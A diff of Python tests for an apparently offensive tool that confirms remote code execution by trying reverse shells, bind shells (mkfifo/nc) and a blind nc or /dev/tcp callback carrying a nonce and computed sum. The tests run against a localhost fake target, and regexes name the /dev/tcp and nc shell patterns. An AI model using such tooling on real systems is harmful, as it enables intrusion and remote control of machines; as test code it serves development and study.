@@ -84,9 +84,11 @@ def test_bind_payload_embeds_port_and_nonce_and_uses_mkfifo_nc():
     assert "TARGET_IP" not in p
 
 
-def test_blind_callback_payload_sends_only_nonce():
-    p = d.blind_callback_payload("192.0.2.8", 40001, "mark7")
+def test_blind_callback_payload_sends_computed_sum_and_nonce():
+    ch = d.Challenge.ephemeral("mark7")
+    p = d.blind_callback_payload("192.0.2.8", 40001, ch)
     assert "40001" in p and "mark7" in p and "192.0.2.8" in p
+    assert str(ch.a) in p and str(ch.b) in p
     assert "TARGET_IP" not in p
 
 
@@ -122,59 +124,56 @@ def test_listener_binds_ephemeral_and_accepts_a_connection():
         conn.close()
 
 
-def test_listener_wait_for_nonce_true_on_match_false_on_timeout():
+def test_listener_wait_for_answer_true_on_match_false_on_timeout():
     import threading, socket as s
+    ch = d.Challenge.ephemeral("tok42")
     with d._Listener(bind_ip="127.0.0.1", timeout=3.0) as lis:
         def client():
             c = s.create_connection(("127.0.0.1", lis.port), timeout=2.0)
-            c.sendall(b"tok42-MARK"); c.close()
+            c.sendall(f"{ch.nonce}:{ch.expected_sum}".encode()); c.close()
         threading.Thread(target=client, daemon=True).start()
-        assert lis.wait_for_nonce("tok42") is True
+        assert lis.wait_for_answer(ch) is True
     with d._Listener(bind_ip="127.0.0.1", timeout=0.4) as lis2:
-        assert lis2.wait_for_nonce("never") is False
+        assert lis2.wait_for_answer(d.Challenge.ephemeral("never")) is False
 
 
 def test_establish_rce_reverse_shell_rung_confirms():
-    # inject drives a fake "target" that connects back to the listener and acts as a shell.
     import threading, socket as s
     nonce = "rv1"
     def inject(cmd):
-        # emulate a target that runs `cmd` -> connect back, send MARK, then answer id/uname
         def run():
-            # extract lport from the payload the primitive built
             import re as _re
             m = _re.search(r"/dev/tcp/([\d.]+)/(\d+)", cmd) or _re.search(r"\"(\d+\.\d+\.\d+\.\d+)\",(\d+)", cmd)
             ip, port = m.group(1), int(m.group(2))
             c = s.create_connection((ip, port), timeout=2.0)
             c.sendall(f"{nonce}-MARK\n".encode())
-            c.recv(4096)                       # the echo/id probe from confirm_shell
-            c.sendall(b"uid=0(root) gid=0(root)\nvictim\n")
+            c.recv(4096)                                   # the substitution probe
+            c.sendall(f"{nonce}.0.root\nvictim\n".encode())  # a real shell substitutes
             c.close()
         threading.Thread(target=run, daemon=True).start()
-    br = establish = d.establish_rce(inject, "127.0.0.1", nonce=nonce, _ip="127.0.0.1",
-                                     ladder_timeout=3.0)
-    assert br.confirmed and br.level == "shell" and br.nonce == nonce
+    br = d.establish_rce(inject, "127.0.0.1", nonce=nonce, _ip="127.0.0.1", ladder_timeout=3.0)
+    assert br.confirmed and br.level == "shell" and br.evidence == "interactive"
+    assert br.nonce == nonce and br.uid == "0"
 
 
 def test_establish_rce_falls_through_to_blind_callback():
-    import threading, socket as s
+    import threading, socket as s, re as _re
     nonce = "bl2"
-    calls = {"n": 0}
     def inject(cmd):
-        calls["n"] += 1
-        # ignore the first two rungs (reverse, bind); only the blind-callback payload
-        # (which contains "| nc" or sends only the mark) triggers a callback.
-        if "-i" in cmd:                # reverse/bind shell payloads spawn /bin/sh -i
+        if "-i" in cmd:                     # skip reverse/bind (they spawn /bin/sh -i)
             return
+        mo = _re.search(r"nc ([\d.]+) (\d+)", cmd) or _re.search(r"/dev/tcp/([\d.]+)/(\d+)", cmd)
+        if not mo:
+            return
+        ip, port = mo.group(1), int(mo.group(2))
+        ops = _re.search(r":\$\(\(\s*(\d+)\s*\+\s*(\d+)\s*\)\)", cmd)   # operands from payload
+        total = int(ops.group(1)) + int(ops.group(2))
         def run():
-            import re as _re
-            m = _re.search(r"nc ([\d.]+) (\d+)", cmd) or _re.search(r"/dev/tcp/([\d.]+)/(\d+)", cmd)
-            ip, port = m.group(1), int(m.group(2))
             c = s.create_connection((ip, port), timeout=2.0)
-            c.sendall(f"{nonce}-MARK".encode()); c.close()
+            c.sendall(f"{nonce}:{total}".encode()); c.close()
         threading.Thread(target=run, daemon=True).start()
     br = d.establish_rce(inject, "127.0.0.1", nonce=nonce, _ip="127.0.0.1", ladder_timeout=1.5)
-    assert br.confirmed and br.level == "blind-rce"
+    assert br.confirmed and br.level == "blind-rce" and br.evidence == "code-exec"
 
 
 def test_establish_rce_returns_unconfirmed_on_dead_target():
